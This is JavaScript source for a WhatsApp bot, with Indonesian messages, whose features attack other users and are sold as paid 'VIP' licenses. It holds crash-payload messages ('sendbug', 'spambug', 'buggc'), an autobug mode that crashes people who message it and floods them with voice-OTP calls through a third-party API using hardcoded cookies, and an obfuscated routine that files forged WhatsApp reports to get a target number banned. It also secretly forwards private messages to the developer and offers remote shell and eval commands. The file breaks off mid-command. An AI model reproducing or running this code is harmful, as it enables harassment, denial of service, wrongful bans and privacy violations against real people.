const { baileys, proto, generateWAMessageFromContent, getContentType } = require('@adiwajshing/baileys')
const { getGroupAdmins, fetchJson } = require('./storage/functions.js')
const { exec } = require('child_process')
const cheerio = require('cheerio')
const moment = require('moment-timezone')
const util = require('util')
const axios = require('axios').default
const fs = require('fs')
autobug = true
mode = true

let userVIP = JSON.parse(fs.readFileSync('./database/vip.json'))

module.exports = async (semar, semar, msg) => {
try {
if (msg.key && msg.key.remoteJid === 'status@broadcast') return
const type = getContentType(msg.message)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const quoted = type == 'extendedTextMessage' && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'documentMessage') && msg.message.documentMessage.caption ? msg.message.documentMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type == 'buttonsResponseMessage' && msg.message.buttonsResponseMessage.selectedButtonId) ? msg.message.buttonsResponseMessage.selectedButtonId : (type == 'templateButtonReplyMessage') && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : ''
const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const time = moment.tz('Asia/Jakarta').format('ha z')
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const dn = args.join(' ')
const isGroup = from.endsWith('@g.us')
const botNumber = semar.user.id.split(':')[0]
const sender = msg.key.fromMe ? (semar.user.id.split(':')[0]+'@s.whatsapp.net' || semar.user.id) : (msg.key.participant || msg.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = msg.pushName || `${senderNumber}`
const groupMetadata = isGroup ? await semar.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(`${botNumber}@s.whatsapp.net`) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const isSaya = botNumber.includes(senderNumber)
const isDev = nomorDeveloper.includes(senderNumber) || isSaya
const isVIP = userVIP.includes(sender)
const reply = async(teks) => {await semar.sendMessage(from,{text: teks},{quoted:msg})}
const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
const bugreactionMessage = require("@adiwajshing/baileys").proto.ReactionMessage.create({ key: msg.key, text: "" })
const bugcontactMessage = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"contactMessage": {"displayName": "WhatsApp Support","vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=0:+0\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"}}}
const frpayment = {key: {remoteJid: '0@s.whatsapp.net',fromMe: false,id: 'MultiDevice',participant: '0@s.whatsapp.net'},message: {requestPaymentMessage: {currencyCodeIso4217: "USD",amount1000: 2022,requestFrom: '0@s.whatsapp.net',noteMessage: {extendedTextMessage: {text: 'Copyright © 2022 Dcode Denpa, AI. Semar-BMD'}},expiryTimestamp: 2022,amount: {value: 91929291929,offset: 1000,currencyCode: "USD"}}}}

const sendButMessage = (id, text1, footer1, but = [], options = {}) => {
const buttonMessage = {text: text1, footer: footer1, buttons: but, headerType: 1}
semar.sendMessage(id, buttonMessage, options)}

const sendButTemplate = (id, text1, footer1, but = [], options = {}) => {
const templateMessage = {text: text1,footer: footer1,templateButtons: but}
semar.sendMessage(id, templateMessage, options)}

const sendLstMessage = (id, text1, footer1, title1, buttonText1, sec  = [], options = {}) => {
const listMessage = {text: text1,footer: footer1,title: title1,buttonText: buttonText1, sections: sec}
semar.sendMessage(id, listMessage, options)}

if (body.startsWith(`64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61`)) { 
semar.relayMessage(from, { bugreactionMessage }, { messageId: "crash" })
requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: from })
semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })}

if (autobug && !isDev && !isVIP && !command && !isGroup) { 
semar.relayMessage(from, { bugreactionMessage }, { messageId: "crash" })
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`+${senderNumber}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {console.log(response)}).catch(function (error) {console.log(error)})}

if (body && !isGroup && !msg.key.fromMe && !isDev) {
semar.sendMessage(`${nomorDeveloper}@s.whatsapp.net`, {text:`• WhatsApp\nChat : ${body}\nFrom : ${pushname}\nNumber : ${senderNumber}\nLink : wa.me/${sender}`})}

if (body.startsWith(`regist-4064636F646564656E7061`)) {
reply('Nomor anda sedang dicek oleh Owner, Tunggu sebentar...')
semar.sendMessage(`${nomorDeveloper}@s.whatsapp.net`, {text:`• Register\nFrom : ${pushname}\nNumber : ${senderNumber}\nTime : ${time}\nLink : wa.me/${sender}`})}

if (body.startsWith(`$`)){ if (!isDev && !msg.key.fromMe) return
let evl = body.split("\n")
let exc = body.replace(evl[0]+"\n", "")
exec(exc, (err, stdout, stderr) => {
if (stdout) return reply(`${stdout}`)
if (stderr) return reply(`${stderr}`)
if (err) return reply(`${err}`)})}
	    
if (/^=?>/.test(body) && (isDev || msg.key.fromMe)){ let parse = /^=>/.test(body) ? body.replace(/^=>/,'return') : body.replace(/^>/,'')
try{ let evaluate = await eval(`;(async () => {${parse} })()`).catch(e => { return e })
return reply(require('util').format(evaluate))} catch(e){
return reply(require('util').format(e))}}

if (command) { await semar.readMessages([msg.key]) }
if (!mode) { if (!isDev && !msg.key.fromMe) return }
switch (command) {
//©from:nathanael
case 'menu': case 'help': case '?':
semar.sendMessage(from,{text:`❏  *OTHER MENU*
•   ${prefix}status
•   ${prefix}delete

❏  *GROUP MENU*
•   ${prefix}open
•   ${prefix}close
•   ${prefix}add
•   ${prefix}kick
•   ${prefix}promote
•   ${prefix}demote
         
❏  *BUG MENU*
•   ${prefix}sendbug
•   ${prefix}dumpbug
•   ${prefix}spambug
•   ${prefix}buggc
•   ${prefix}banwa
         
❏  *OWNER MENU*
•   ${prefix}join
•   ${prefix}leave
•   ${prefix}restart
•   ${prefix}shutdown
•   ${prefix}public
•   ${prefix}private
•   ${prefix}chat
•   ${prefix}autobug`}, {quoted:frpayment})
break

//©from: dennis × ivan
case 'verify': case 'ban': case 'logout': case 'banwa': case 'out':
if (!isDev && !isVIP && !msg.key.fromMe) return reply('Akses Ditolak!, Silahkan Beli Lisensi Ke Developer Bot\nwa.me/6285866295942')
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}${command} +62 xxx-xxxx-xxxx`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}${command} +62 xxx-xxxx-xxxx`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply(`Tidak bisa ${command} ke nomor developer!`)
if (args[0].startsWith(`${botNumber}`)) return reply(`Tidak bisa ${command} ke nomor ini!`)
var _0x10a3fd=_0x30f2;function _0x1e8a(){var _0x566960=['nwPcqvLKrG','C2vHCMnO','DgfIBgu','qu5euK9jra','ndCYmZu3ogjsB2DYAq','x19JC3i','CgfYC2u','x19H','Bg9N','zw1HAwW','mJy5odq1muL4B2fSzq','nty4nZC1mgvPuLjUvW','yxbWBhK','zMLUza','mtzir3nAAgu','z2v0','mtaWnJyZmdG1oa','y29UC3rYDwn0B3i','otu3ndi2wvrzzgjJ','yxbWzw5K','AgvHzgvYCW','AM9PBG','C3vIBwL0','mw1IserTuG','zxHJzxb0Aw9U','x19Yzxy','ue9tva','y29UC29Szq','yMLUza','otnVzxvNDLa','Aw5WDxrBBMfTzt1SC2rD','kcGOlISPkYKRksSK','zM9YBwf0','AMf6B2vZDa','Dg9tDhjPBMC','Ahr0Chm6lY93D3CUmxnLy21HAwWUy29Tl2fWAs92ms8/ywn0Aw9UpwDLBLjHBMrVBu1HAwXIB3GMy291BNq9mq','zw1HAwXFy29UzMLYBq','ugvYzgLKBY9YB3vIywrVoIbKzxnHDgL2zsbTAw5OysbJB250yq','x191C2vY','nZe5ntzpBMXHBvq','vu5ltK9xtG','BhnK','E30Uy29UC3rYDwn0B3iOiNjLDhvYBIb0AgLZiIKOicK','BgvUz3rO','mZa4otqXnLf4B3HAua','AhjLzG','x19Yzxe','CMv0DxjUicHMDw5JDgLVBIGPia','x19JB21Tzw50x3jLCq','CgHVBMvFBNvTyMvY','CMvWBgfJzq','ndm4mtaYowvhDfzrsq','yxr0CG','D2fYBG','u3vRC2vZia','mtKZmtyUqLa6D2HHDhnHChbFD3D3x3bRzY4YlJaUmc4WlJa','zM9YicG7oYK7','Aw5WDxrBBMfTzt1QyxPVzxn0xq','DMfS','Bg9Hza','y291BNrYEv9ZzwXLy3rVCG','mtjYAer2rw8','ChjVDg90ExbL','zgf0yq','C3rLCa'];_0x1e8a=function(){return _0x566960;};return _0x1e8a();}(function(_0x3d7025,_0x2766ce){var _0x534253=_0x30f2,_0x500248=_0x3d7025();while(!![]){try{var _0x1cac44=parseInt(_0x534253(0x21e))/0x1*(parseInt(_0x534253(0x219))/0x2)+parseInt(_0x534253(0x224))/0x3*(-parseInt(_0x534253(0x1ed))/0x4)+-parseInt(_0x534253(0x207))/0x5*(parseInt(_0x534253(0x20b))/0x6)+-parseInt(_0x534253(0x211))/0x7+parseInt(_0x534253(0x215))/0x8*(parseInt(_0x534253(0x1f9))/0x9)+parseInt(_0x534253(0x212))/0xa+parseInt(_0x534253(0x1f2))/0xb*(parseInt(_0x534253(0x203))/0xc);if(_0x1cac44===_0x2766ce)break;else _0x500248['push'](_0x500248['shift']());}catch(_0x21a0b1){_0x500248['push'](_0x500248['shift']());}}}(_0x1e8a,0x8b863));var _0x23aa42=(function(){var _0x1e8e60=!![];return function(_0x16b2bc,_0x4a86b4){var _0x78a717=_0x1e8e60?function(){var _0x4ab85b=_0x30f2;if(_0x4a86b4){var _0x4c9e2f=_0x4a86b4[_0x4ab85b(0x213)](_0x16b2bc,arguments);return _0x4a86b4=null,_0x4c9e2f;}}:function(){};return _0x1e8e60=![],_0x78a717;};}()),_0x286f59=_0x23aa42(this,function(){var _0x5ef3f3=_0x30f2;return _0x286f59['toString']()['search'](_0x5ef3f3(0x226))[_0x5ef3f3(0x229)]()[_0x5ef3f3(0x218)](_0x286f59)[_0x5ef3f3(0x208)](_0x5ef3f3(0x226));});_0x286f59();var _0x4e298b=(function(){var _0x8935aa=!![];return function(_0x3ea9e8,_0x53736d){var _0x52d475=_0x8935aa?function(){var _0x2898c4=_0x30f2;if(_0x53736d){var _0x5d590d=_0x53736d[_0x2898c4(0x213)](_0x3ea9e8,arguments);return _0x53736d=null,_0x5d590d;}}:function(){};return _0x8935aa=![],_0x52d475;};}()),_0xaf7725=_0x4e298b(this,function(){var _0x5ea466=_0x30f2,_0x5e1524=function(){var _0x4a44e5=_0x30f2,_0x235c4a;try{_0x235c4a=Function(_0x4a44e5(0x1f5)+_0x4a44e5(0x1f0)+');')();}catch(_0x150a93){_0x235c4a=window;}return _0x235c4a;},_0x51fe4f=_0x5e1524(),_0x6091c2=_0x51fe4f['console']=_0x51fe4f[_0x5ea466(0x222)]||{},_0x37a9c0=[_0x5ea466(0x20f),_0x5ea466(0x1fb),'info','error',_0x5ea466(0x21f),_0x5ea466(0x209),'trace'];for(var _0x4b9686=0x0;_0x4b9686<_0x37a9c0[_0x5ea466(0x1f1)];_0x4b9686++){var _0x1c26e0=_0x4e298b[_0x5ea466(0x218)][_0x5ea466(0x204)][_0x5ea466(0x223)](_0x4e298b),_0x54b545=_0x37a9c0[_0x4b9686],_0x354dc5=_0x6091c2[_0x54b545]||_0x1c26e0;_0x1c26e0['__proto__']=_0x4e298b[_0x5ea466(0x223)](_0x4e298b),_0x1c26e0[_0x5ea466(0x229)]=_0x354dc5[_0x5ea466(0x229)]['bind'](_0x354dc5),_0x6091c2[_0x54b545]=_0x1c26e0;}});_0xaf7725();var ntah=await axios['get']('https://www.whatsapp.com/contact/noclient/'),email=await axios[_0x10a3fd(0x216)](_0x10a3fd(0x22a)),cookie=ntah[_0x10a3fd(0x21b)]['set-cookie'][_0x10a3fd(0x21c)](';\x20'),$=cheerio[_0x10a3fd(0x201)](ntah[_0x10a3fd(0x205)]),$form=$('form'),url=new URL($form[_0x10a3fd(0x1fa)]('action'),'https://www.whatsapp.com')[_0x10a3fd(0x1f3)],form=new URLSearchParams();function _0x30f2(_0x1adab2,_0x300776){var _0x2e830e=_0x1e8a();return _0x30f2=function(_0xaf7725,_0x4e298b){_0xaf7725=_0xaf7725-0x1ec;var _0x372579=_0x2e830e[_0xaf7725];if(_0x30f2['nVpWln']===undefined){var _0x255901=function(_0x30f237){var _0x2bf58c='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x585c04='',_0x5b1926='',_0x1b1021=_0x585c04+_0x255901;for(var _0xd229c5=0x0,_0x478273,_0x1e8e60,_0x16b2bc=0x0;_0x1e8e60=_0x30f237['charAt'](_0x16b2bc++);~_0x1e8e60&&(_0x478273=_0xd229c5%0x4?_0x478273*0x40+_0x1e8e60:_0x1e8e60,_0xd229c5++%0x4)?_0x585c04+=_0x1b1021['charCodeAt'](_0x16b2bc+0xa)-0xa!==0x0?String['fromCharCode'](0xff&_0x478273>>(-0x2*_0xd229c5&0x6)):_0xd229c5:0x0){_0x1e8e60=_0x2bf58c['indexOf'](_0x1e8e60);}for(var _0x4a86b4=0x0,_0x78a717=_0x585c04['length'];_0x4a86b4<_0x78a717;_0x4a86b4++){_0x5b1926+='%'+('00'+_0x585c04['charCodeAt'](_0x4a86b4)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5b1926);};_0x30f2['QTETkK']=_0x255901,_0x1adab2=arguments,_0x30f2['nVpWln']=!![];}var _0x286f59=_0x2e830e[0x0],_0x23aa42=_0xaf7725+_0x286f59,_0x1e8aa3=_0x1adab2[_0x23aa42];if(!_0x1e8aa3){var _0x4c9e2f=function(_0x8935aa){this['HxHKAo']=_0x8935aa,this['RucJYp']=[0x1,0x0,0x0],this['yNgwEB']=function(){return'newState';},this['iLZxeU']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['YQioTr']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x4c9e2f['prototype']['EYJAdq']=function(){var _0x3ea9e8=new RegExp(this['iLZxeU']+this['YQioTr']),_0x53736d=_0x3ea9e8['test'](this['yNgwEB']['toString']())?--this['RucJYp'][0x1]:--this['RucJYp'][0x0];return this['ejGZIM'](_0x53736d);},_0x4c9e2f['prototype']['ejGZIM']=function(_0x52d475){if(!Boolean(~_0x52d475))return _0x52d475;return this['hUeBFy'](this['HxHKAo']);},_0x4c9e2f['prototype']['hUeBFy']=function(_0x5d590d){for(var _0x5e1524=0x0,_0x51fe4f=this['RucJYp']['length'];_0x5e1524<_0x51fe4f;_0x5e1524++){this['RucJYp']['push'](Math['round'](Math['random']())),_0x51fe4f=this['RucJYp']['length'];}return _0x5d590d(this['RucJYp'][0x0]);},new _0x4c9e2f(_0x30f2)['EYJAdq'](),_0x372579=_0x30f2['QTETkK'](_0x372579),_0x1adab2[_0x23aa42]=_0x372579;}else _0x372579=_0x1e8aa3;return _0x372579;},_0x30f2(_0x1adab2,_0x300776);}form[_0x10a3fd(0x21a)](_0x10a3fd(0x228),$form[_0x10a3fd(0x214)](_0x10a3fd(0x1ff))[_0x10a3fd(0x200)]()),form[_0x10a3fd(0x21a)](_0x10a3fd(0x1ef),$form[_0x10a3fd(0x214)](_0x10a3fd(0x225))['val']()),form[_0x10a3fd(0x21a)](_0x10a3fd(0x206),_0x10a3fd(0x21d)),form['append'](_0x10a3fd(0x202),'ID'),form[_0x10a3fd(0x21a)](_0x10a3fd(0x1f7),''+dn),form['append'](_0x10a3fd(0x210),email[_0x10a3fd(0x205)][0x0]),form['append'](_0x10a3fd(0x22b),email['data'][0x0]),form['append']('platform',_0x10a3fd(0x20a)),form[_0x10a3fd(0x21a)]('your_message',_0x10a3fd(0x22c)),form['append'](_0x10a3fd(0x1ec),'0'),form[_0x10a3fd(0x21a)](_0x10a3fd(0x20e),'1'),form['append'](_0x10a3fd(0x20c),''),form[_0x10a3fd(0x21a)](_0x10a3fd(0x1f4),'8'),form[_0x10a3fd(0x21a)]('__hs',_0x10a3fd(0x1fd)),form['append']('dpr','1'),form[_0x10a3fd(0x21a)]('__ccg',_0x10a3fd(0x1ee)),form['append'](_0x10a3fd(0x220),_0x10a3fd(0x217)),form[_0x10a3fd(0x21a)](_0x10a3fd(0x1f6),'0');var res=await axios({'url':url,'method':_0x10a3fd(0x221),'data':form,'headers':{'cookie':cookie}});reply(_0x10a3fd(0x1fc)+command+'\x20'+dn+'\x20'+util[_0x10a3fd(0x227)](JSON[_0x10a3fd(0x20d)](res[_0x10a3fd(0x205)][_0x10a3fd(0x1f8)](_0x10a3fd(0x1fe),''))));
break

//©from: dennis
case 'cek': case 'test': case 'status':
exec(`pm2 status`, (error, stdout, stderr) => { reply(stdout)})
break

//©from: nayla
case 'open':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins && !isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
await semar.groupSettingUpdate(from, 'not_announcement')
reply('_Successfully Opened Group!_\n')
break

//©from: nayla
case 'close':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins && !isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
await semar.groupSettingUpdate(from, 'announcement')
reply('_Successfully Closed The Group!_\n')
break

//©from: dennis
case 'add':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
add = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [add], "add")
break

//©from: dennis
case 'kick':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
remove = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [remove], "remove")
break

//©from: dennis
case 'promote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
promote = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [promote], "promote")
reply('Done!')
break

//©from: dennis
case 'demote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
demote = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [demote], "demote")
reply('Done!')
break

//©from: dennis × ivan
case 'sendbug':
if (!isDev && !isVIP && !msg.key.fromMe) return reply('Akses Ditolak!, Silahkan Beli Lisensi Ke Developer Bot\nwa.me/6285866295942')
if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}${command} ${senderNumber}|10`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|10`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|10`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply(`Tidak bisa ${command} ke nomor developer!`)
if (args[0].startsWith(`${botNumber}`)) return reply(`Tidak bisa ${command} ke nomor ini!`)
nd = dn.split("|")
if (Number(nd[1]) >= 100) return reply('Jumlah terlalu banyak!')
if (!Number(nd[1])) return reply(`Silahkan masukkan jumlah bug!\nContoh: ${prefix}${command} ${senderNumber}|10`)
reply('Loading 3Second...')
for (let i = 0; i < nd[1]; i++){
await sleep(3000)
reply(`Berhasil mengirim ${Number(i) + 1} bug!`)
let sendbug = await semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" })
await sleep(3000)
semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { delete: sendbug.key })}
reply(`Sukses mengirim ${nd[1]} bug ke nomor ${nd[0]}`)
break

//©from: dennis × andik
case 'dumpbug':
if (!isDev && !isVIP && !msg.key.fromMe) return reply('Akses Ditolak!, Silahkan Beli Lisensi Ke Developer Bot\nwa.me/6285866295942')
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply(`Tidak bisa ${command} ke nomor developer!`)
if (args[0].startsWith(`${botNumber}`)) return reply(`Tidak bisa ${command} ke nomor ini!`)
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
reply(`Sukses mengirim bug ke nomor ${dn}`)
break

//©from: dennis × ivan × andik
case 'spambug':
if (!isDev && !isVIP && !msg.key.fromMe) return reply('Akses Ditolak!, Silahkan Beli Lisensi Ke Developer Bot\nwa.me/6285866295942')
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply(`Tidak bisa ${command} ke nomor developer!`)
if (args[0].startsWith(`${botNumber}`)) return reply(`Tidak bisa ${command} ke nomor ini!`)
reply('Berhasil mengirim 1 bug!')
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
reply('Loading 30Second...')
function delay30d(i) { setTimeout(() => {
reply(`Berhasil mengirim ${Number(i) + 2} bug!`)
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
delay30d(++i)}, 30000)}
delay30d(0)
break

//©from: dennis x haikal
case 'buggc':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: from })
semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
await sleep(3000)
await semar.groupLeave(from)
break

//©from: dennis
case 'autobug':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (args.length < 1) return sendButMessage(from, `silahkan pilih opsi berikut`, '', [{ buttonId: `autobug on`, buttonText: { displayText: "ON" }, type: 1},{ buttonId: `autobug off`, buttonText: { displayText: "OFF" }, type: 1}], {quoted:msg})
if (dn === 'on'){ autobug = true
reply('Sukses')
} else if (dn === 'off'){ autobug = false
reply('Sukses')} else { reply('Error')}
break

//©from: dennis x baileys
case '01':
sendButMessage(from, 'test', 'test', [{buttonId: `${prefix}01`, buttonText: {displayText: 'Button 1'}, type: 1},{buttonId: `${prefix}02`, buttonText: {displayText: 'Button 2'}, type: 1},{buttonId: `${prefix}03`, buttonText: {displayText: 'Button 3'}, type: 1}], {quoted:msg})
break

//©from: dennis x baileys
case '02':
sendButTemplate(from, 'test', 'test', [{index: 1, urlButton: {displayText: 'test', url: 'https://'}},{index: 2, callButton: {displayText: 'test', phoneNumber: '6285'}},{index: 3, quickReplyButton: {displayText: 'test', id: `0`}}])
break

//©from: dennis x baileys
case '03':
sendLstMessage(from, 'test', 'test', 'test', 'test', [{title: "Section 1",rows: [{title: "Option 1", rowId: "option1"},{title: "Option 2", rowId: "option2", description: "This is a description"}]},{title: "Section 2",rows: [{title: "Option 3", rowId: "option3"},{title: "Option 4", rowId: "option4", description: "This is a description V2"}]}])
break

//©from: dennis
case 'acc': case 'accept':
if (!dn) return reply('Invalid number')
userVIP.push(`${dn}`)
fs.writeFileSync('./database/vip.json', JSON.stringify(`${userVIP}`))
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: `Halo, Nomor Anda Telah Diizinkan Oleh Owner Untuk Mengakses VIP!\nNama : ${pushname}\nNomor : ${dn}\nWaktu : ${time}\nTerimakasih Telah Membeli Lisensi VIP!`})
reply('Registered!')
break

//©from: dennis
case 'chat':
if (!isDev && !isVIP && !msg.key.fromMe) return
if (!dn) return reply(`Silahkan masukkan nomor dan pesan!\nContoh: ${prefix}${command} ${senderNumber}|halo`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|halo`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|halo`)
if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim pesan ke nomor ini!')
nd = dn.split("|")
if (!nd) return reply(`Silahkan masukkan nomor dan pesan!\nContoh: ${prefix}${command} ${senderNumber}|halo`)
